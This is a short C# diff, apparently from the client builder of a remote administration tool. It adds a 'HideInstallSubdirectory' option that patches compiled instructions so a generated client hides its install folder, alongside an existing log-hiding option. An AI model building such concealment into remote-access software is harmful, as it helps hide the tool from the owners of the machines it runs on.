@@ -94,6 +94,9 @@ namespace xServer.Core.Build
                                         case 5: //HideLogDirectory
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideLogDirectory));
                                             break;
+                                        case 6: // HideInstallSubdirectory
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideInstallSubdirectory));
+                                            break;
                                     }
                                     bools++;
                                 }
